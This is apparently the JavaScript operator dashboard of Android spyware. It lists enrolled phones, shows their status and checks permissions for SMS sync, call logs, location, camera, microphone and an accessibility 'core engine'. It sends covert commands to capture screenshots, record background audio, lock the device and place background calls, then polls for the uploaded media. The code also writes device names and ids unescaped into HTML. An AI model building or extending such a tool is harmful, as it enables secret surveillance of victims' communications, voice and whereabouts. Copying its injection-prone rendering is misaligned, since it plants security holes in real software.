class DashboardEngine {
    constructor() {
        this.activeDeviceId = localStorage.getItem('active_device_id');
        this.init();
    }

    async init() {
        await this.loadDevicesList();
        if (!this.activeDeviceId) return; 
        await this.loadDeviceMetrics();
        setInterval(() => this.loadDeviceMetrics(), 10000);
    }

    async loadDevicesList() {
        const token = localStorage.getItem('owner_token');
        try {
            const res = await fetch('/api/devices', {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const result = await res.json();

            if (result.status === 'success') {
                const selectEl = document.getElementById('device-select');
                if (selectEl) {
                    selectEl.innerHTML = ''; 
                    if (result.data.length === 0) {
                        selectEl.innerHTML = '<option value="">No Devices Found</option>';
                        return;
                    }
                    result.data.forEach(dev => {
                        const option = document.createElement('option');
                        option.value = dev.id;
                        option.textContent = dev.name;
                        selectEl.appendChild(option);
                    });
                    if (!this.activeDeviceId && result.data.length > 0) {
                        this.activeDeviceId = result.data[0].id;
                        localStorage.setItem('active_device_id', this.activeDeviceId);
                    }
                    selectEl.value = this.activeDeviceId;
                    selectEl.addEventListener('change', (e) => {
                        this.activeDeviceId = e.target.value;
                        localStorage.setItem('active_device_id', this.activeDeviceId);
                        this.loadDeviceMetrics(); 
                    });
                }
            }
        } catch (e) {
            console.error("Failed to load devices list:", e);
        }
    }

    async loadDeviceMetrics() {
        const token = localStorage.getItem('owner_token');
        try {
            const res = await fetch('/api/devices', {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const result = await res.json();
            if (result.status === 'success') {
                const dev = result.data.find(d => d.id === this.activeDeviceId);
                if (dev) this.populateMetadata(dev);
            }
        } catch (e) { console.error("Telemetry Fetch Error:", e); }
    }

    populateMetadata(dev) {
        const badge = document.getElementById('online-badge');
        if (badge) {
            badge.style.color = dev.online_status ? '#2ecc71' : '#e74c3c';
            badge.innerText = dev.online_status ? '● ONLINE' : '○ OFFLINE';
        }

        const batteryEl = document.getElementById('metric-battery');
        const batteryCard = document.getElementById('battery-card');
        const batteryState = document.getElementById('battery-state');
        if (batteryEl && batteryCard) {
            batteryEl.textContent = `${dev.battery_level || 0}%`;
            if (dev.is_charging) {
                batteryCard.className = 'flat-card bg-green';
                batteryState.textContent = 'Charging';
            } else {
                batteryCard.className = 'flat-card bg-red';
                batteryState.textContent = 'Discharging';
            }
        }

        const storageEl = document.getElementById('metric-storage');
        if (storageEl) storageEl.textContent = dev.storage_used || 'N/A';

        const nameEl = document.getElementById('info-name');
        if (nameEl) {
            nameEl.innerHTML = `
                <div style="font-size: 1.1rem; color: white;">
                    ${dev.name || 'Unknown'} <span style="font-size: 0.8rem; opacity: 0.8;">(${dev.model || ''})</span>
                </div>
                <button onclick="deleteDevice('${dev.id}')" style="margin-top: 8px; background: rgba(231, 76, 60, 0.2); color: #e74c3c; border: 1px solid #e74c3c; border-radius: 4px; padding: 4px 10px; cursor: pointer; font-size: 0.7rem; font-weight: bold; text-transform: uppercase;">
                    Remove Device
                </button>
            `;
        }
    }
}

// ==========================================
// 🚀 SECURE REMOTE ACTIONS ENGINE
// ==========================================

window.executeRemoteAction = async function(actionType, extraParams = {}) {
    const deviceId = localStorage.getItem('active_device_id');
    const token = localStorage.getItem('owner_token');
    
    if (!deviceId) return alert("No active device selected.");

    try {
        const res = await fetch(`/api/devices/${deviceId}/action`, {
            method: 'POST',
            headers: { 
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ action: actionType, ...extraParams }) 
        });
        
        const result = await res.json();
        if (result.status !== 'success') {
            alert(`❌ Action Failed: ${result.message}`);
            setLiveOpsStatus('idle'); 
        }
    } catch (e) {
        console.error("Action Execution Error:", e);
        alert("Network error.");
        setLiveOpsStatus('idle');
    }
};

// ==========================================
// 🚀 REAL-TIME POLLING ENGINE FOR LIVE OPS
// ==========================================
window.activePollId = null; 

window.setLiveOpsStatus = (state, message = '', fileUrl = '#') => {
    const statusDiv = document.getElementById('live-ops-status');
    const btnScreen = document.getElementById('btn-screenshot');
    const btnAudio = document.getElementById('btn-audio');
    
    if (!statusDiv) return;

    if (state === 'idle') {
        statusDiv.style.display = 'none';
        btnScreen.disabled = false;
        btnAudio.disabled = false;
        if (window.activePollId) clearInterval(window.activePollId);
    } 
    else if (state === 'pending') {
        statusDiv.style.display = 'block';
        btnScreen.disabled = true;
        btnAudio.disabled = true;
        statusDiv.innerHTML = `<span style="color: #f1c40f; font-weight: bold;">⏳ ${message} <br/><small style="color:#ccc; font-weight:normal;">Polling backend for incoming file...</small></span>`;
    } 
    else if (state === 'ready') {
        btnScreen.disabled = false;
        btnAudio.disabled = false;
        if (window.activePollId) clearInterval(window.activePollId);
        statusDiv.innerHTML = `
            <span style="color: #2ecc71; margin-bottom: 8px; display: block; font-weight: bold;">✅ ${message}</span>
            <a href="${fileUrl}" target="_blank" style="background: #3498db; color: white; padding: 8px 16px; border-radius: 4px; text-decoration: none; display: inline-block; font-weight: bold; font-size: 13px; text-transform: uppercase;">View / Play Media</a>
        `;
    }
};

window.pollForMedia = async (actionTime, mediaType) => {
    const deviceId = localStorage.getItem('active_device_id');
    const token = localStorage.getItem('owner_token');
    if (!deviceId || !token) return;

    let attempts = 0;
    const maxAttempts = 25; 

    if (window.activePollId) clearInterval(window.activePollId);

    window.activePollId = setInterval(async () => {
        attempts++;
        if (attempts > maxAttempts) {
            clearInterval(window.activePollId);
            window.setLiveOpsStatus('idle');
            alert("Timeout: The device hasn't uploaded the file yet. It might be offline or recording.");
            return;
        }

        try {
            const res = await fetch(`/api/files?device_id=${deviceId}&limit=5`, {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            const result = await res.json();
            
            if (result.status === 'success' && result.data && result.data.length > 0) {
                const latestFile = result.data[0];
                const fileTime = new Date(latestFile.uploaded_at).getTime();
                
                if (fileTime > actionTime && latestFile.file_type.includes(mediaType)) {
                    clearInterval(window.activePollId);
                    window.setLiveOpsStatus('ready', 'Media Extracted Successfully!', latestFile.file_url);
                }
            }
        } catch (e) {
            console.error("Polling Network Error:", e);
        }
    }, 3000); 
};

// ==========================================
// 🚀 TACTICAL COMMANDS EXECUTORS
// ==========================================

window.requestScreenshot = () => {
    const actionTime = Date.now() - 5000;
    setLiveOpsStatus('pending', 'Injecting Screen Capture Payload...');
    window.executeRemoteAction('take_screenshot');
    window.pollForMedia(actionTime, 'screenshot');
};

window.requestAudioSync = () => {
    const actionTime = Date.now() - 5000;
    const duration = document.getElementById('audio-duration').value;
    setLiveOpsStatus('pending', `Recording Audio Background (${duration}s)...`);
    window.executeRemoteAction('record_audio', { duration: parseInt(duration) });
    window.pollForMedia(actionTime, 'audio');
};

window.forceLockDevice = () => {
    alert("Lock Command Sent. Device Admin permissions will handle execution.");
    window.executeRemoteAction('force_lock');
};

window.triggerRing = () => {
    alert("Ring Command Queued: The device will play an alarm at max volume.");
    window.executeRemoteAction('ring_device');
};

window.triggerSOS = () => {
    alert("SOS Call Initiated: The device will attempt a background call to the Admin.");
    window.executeRemoteAction('call_admin');
};

// Global Device Deletion
window.deleteDevice = async function(deviceId) {
    if (!confirm("WARNING: Are you sure you want to permanently remove this device?")) return;
    const token = localStorage.getItem('owner_token');
    try {
        const res = await fetch(`/api/devices/${deviceId}`, {
            method: 'DELETE',
            headers: { 'Authorization': `Bearer ${token}` }
        });
        const result = await res.json();
        if (result.status === 'success') {
            alert("Device removed.");
            localStorage.removeItem('active_device_id'); 
            window.location.reload(); 
        }
    } catch (e) {
        console.error("Delete Action Failed:", e);
    }
};

// ==========================================
// 🚀 DIAGNOSTICS & SETTINGS CHECK ENGINE
// ==========================================

window.openSettingsCheckModal = async () => {
    const modal = document.getElementById('diagnostics-modal');
    const content = document.getElementById('diagnostics-content');
    const deviceId = localStorage.getItem('active_device_id');

    if (!modal || !content) return;
    
    modal.style.display = 'flex';
    content.innerHTML = '<p style="color: #888; text-align: center; margin-top: 20px;">Fetching remote diagnostic data from Supabase...</p>';

    if (!deviceId) {
        content.innerHTML = '<p style="color: #e74c3c; text-align: center; margin-top: 20px;">No active device selected.</p>';
        return;
    }

    try {
        const configRes = await fetch('/api/config');
        const config = await configRes.json();
        
        // Supabase query to get the latest permission sync data for the active device
        const permRes = await fetch(`${config.supabase_url}/rest/v1/permissions?device_id=eq.${deviceId}&order=created_at.desc&limit=1`, {
            headers: {
                'apikey': config.supabase_key,
                'Authorization': `Bearer ${config.supabase_key}`
            }
        });

        const data = await permRes.json();

        if (!data || data.length === 0) {
            content.innerHTML = '<p style="color: #f39c12; text-align: center; margin-top: 20px;">No diagnostic data received from device yet.</p>';
            return;
        }

        const perms = data[0];
        
        // Matrix Map Builder
        const map = {
            'Accessibility (Core Engine)': perms.accessibility,
            'Location Tracking': perms.location,
            'Notification Access': perms.notification_access,
            'Storage & Media Files': perms.storage,
            'Microphone (Live Ops)': perms.microphone,
            'Camera Access': perms.camera,
            'Call Logs Parsing': perms.call_log,
            'SMS Message Sync': perms.sms,
            'Phone State Monitoring': perms.phone,
            'Screen Capture Overlay': perms.screen_recording
        };

        let html = '<div style="display: flex; flex-direction: column; gap: 10px; margin-top: 15px;">';
        
        for (const [key, value] of Object.entries(map)) {
            const color = value ? '#2ecc71' : '#e74c3c';
            const icon = value ? '✔' : '✖';
            html += `
                <div style="display: flex; justify-content: space-between; align-items: center; background: #2a2a2a; padding: 12px 15px; border-radius: 6px; border-left: 4px solid ${color};">
                    <span style="font-weight: 600; color: #ddd; font-size: 14px;">${key}</span>
                    <span style="color: ${color}; font-weight: 900; font-size: 18px;">${icon}</span>
                </div>
            `;
        }
        html += '</div>';
        
        content.innerHTML = html;

    } catch (e) {
        console.error("Diagnostics Fetch Error:", e);
        content.innerHTML = '<p style="color: #e74c3c; text-align: center; margin-top: 20px;">Network Error. Failed to fetch diagnostics.</p>';
    }
};

window.closeSettingsCheckModal = () => {
    const modal = document.getElementById('diagnostics-modal');
    if (modal) modal.style.display = 'none';
};

document.addEventListener('DOMContentLoaded', () => {
    new DashboardEngine();
});
